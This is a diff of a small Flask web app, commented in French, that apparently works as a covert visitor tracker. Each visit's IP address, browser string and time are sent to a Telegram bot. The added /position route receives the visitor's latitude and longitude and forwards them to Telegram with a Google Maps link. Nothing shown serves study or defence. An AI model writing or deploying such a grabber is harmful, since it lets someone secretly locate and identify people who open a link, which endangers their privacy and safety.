@@ -1,5 +1,4 @@
-
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, jsonify
 import datetime
 import requests
 
@@ -26,15 +25,28 @@ def accueil():
     navigateur = request.user_agent.string
     date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Message à envoyer
     message = f"📥 Nouvelle visite détectée :\n" \
               f"🕒 Date : {date}\n" \
               f"🌍 IP : {ip}\n" \
               f"🖥 Navigateur : {navigateur}"
 
     envoyer_telegram(message)
-
     return render_template("page.html")
+
+@app.route("/position", methods=["POST"])
+def position():
+    data = request.get_json()
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
+
+    if latitude and longitude:
+        message = f"📍 Position approximative reçue :\n" \
+                  f"Latitude : {latitude}\n" \
+                  f"Longitude : {longitude}\n" \
+                  f"https://www.google.com/maps?q={latitude},{longitude}"
+        envoyer_telegram(message)
+
+    return jsonify({"status": "ok"})
 
 if __name__ == "__main__":
     app.run(debug=True)
